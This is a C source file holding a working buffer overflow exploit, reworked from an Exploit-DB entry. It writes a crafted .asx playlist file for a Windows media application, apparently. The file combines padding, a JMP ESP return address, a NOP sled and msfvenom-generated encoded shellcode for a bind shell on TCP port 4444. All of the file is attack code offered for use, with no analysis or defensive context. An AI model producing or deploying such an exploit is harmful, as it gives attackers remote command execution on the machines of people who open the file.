/*
 * Author: Martin Perina
 * Based off of: https://www.exploit-db.com/exploits/38457
 * 	which is broken and stupid
 *
 *  So I made this
 */

#include <stdio.h>
#include <windows.h>
#include <malloc.h>
#include <string.h>

int main(void) {

	 // Offest A * 249
	 int initial_buffer_size = 249 + 1; 
    char *padding = malloc(initial_buffer_size);                                                   
    memset(padding, 0x41, initial_buffer_size);                                                    
    memset(padding + initial_buffer_size - 1, 0x00, 1); // this may not be needed but im in a hurry

	 // Return Address, JMP ESP @ 1003789D 
	 char retn[] = "\x9d\x78\x03\x10";

	 // Shellcode
	 // msfvenom -a x86 -p windows/shell/bind_tcp LPORT=4444 â€“e x86/shikata_ga_nai -b "\x00\x09\x0a\x1a" -f c
	 char shellcode[] =
			  "\xbd\xde\x38\x4c\xb9\xdd\xc0\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x83\xea\xfc\x31\x6a\x10\x03\x6a\x10\x3c\xcd\xb0\x51\x4f"
"\x2e\x49\xa2\x2f\x1e\x9b\xc6\x24\x32\x2b\x8c\x68\xbf\xc2\x77"
"\x07\xed\xc0\xfc\x65\x3a\xe6\xb5\xc3\x1c\xc9\x46\xe2\xa0\x85"
"\x85\x65\x5d\xd4\xd9\x45\x5c\x17\x2c\x84\x99\xe1\x5a\x69\x77"
"\xa5\x2f\x27\x68\xc2\x72\xfb\x89\x04\xf9\x43\xf2\x21\x3e\x37"
"\x4e\x2b\x6f\x3c\x16\x0b\xdf\xc9\xef\x53\xde\x1e\x6a\xaa\x94"
"\x9c\x44\xd2\x1c\x57\x92\xa7\x9e\xb1\xea\x77\x0c\xfc\xc2\x75"
"\x4c\x39\xe4\x65\x3b\x31\x16\x1b\x3c\x82\x64\xc7\xc9\x14\xce"
"\x8c\x6a\xf0\xee\x41\xec\x73\xfc\x2e\x7a\xdb\xe1\xb1\xaf\x50"
"\x1d\x39\x4e\xb6\x97\x79\x75\x12\xf3\xda\x14\x03\x59\x8c\x29"
"\x53\x05\x71\x8c\x18\xa4\x64\xb0\xe1\x36\x89\xec\x75\xfa\x44"
"\x0f\x85\x94\xdf\x7c\xb7\x3b\x74\xeb\xfb\xb4\x52\xec\xfc\xee"
"\x23\x62\x03\x11\x54\xaa\xc7\x45\x04\xc4\xee\xe5\xcf\x14\x0f"
"\x30\x65\x1e\xb6\xeb\x98\xdd\x22\x0d\x37\x1c\xda\xe7\xc8\xff"
"\xfa\x07\x03\x68\x92\xf5\xac\x86\x3e\x73\x4a\xc2\xae\xd5\xc4"
"\x7b\x0c\x02\xdd\x1c\x6f\x60\xa7\x23\x80\x0e\xf0\xa3\x9e\x10"
"\x56\xcc\x29\xf9\x60\xf3\xaa\x2f\xc7\x63\x20\x3c\xd3\x92\x37"
"\x69\x73\xc2\xaf\xe7\x12\xa1\x4e\xf7\x3e\x53\x90\x6d\xc5\xf2"
"\xc7\x19\xc7\x23\x2f\x86\x38\x06\x2c\xc1\xc7\xd7\x1f\xb9\xfe"
"\x4d\x1f\xd5\xfe\x81\x9f\x25\xa9\xcb\x9f\x4d\x0d\xa8\xcc\x68"
"\x52\x65\x61\x21\xc7\x86\xd3\x95\x40\xef\xd9\xc0\xa7\xb0\x22"
"\x27\xb4\xb7\xdc\xb6\xbc\x46\x1f\x6f\x05\x3d\x76\xb3\x32\x4e"
"\x3d\x96\x13\xc5\x3d\x84\x64\xcc";

	 char nops[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

	 int buff_size = strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(nops);
	 char *buffer = malloc(buff_size);
	 memset(buffer, 0x00, buff_size);
	 strcpy(buffer, padding);
	 strcat(buffer, retn);
	 strcat(buffer, nops);
	 strcat(buffer, shellcode);

	 FILE *f;
	 f = fopen("new.asx", "w");
	 fprintf(f, buffer);
	 fclose(f);

    return 0;
}
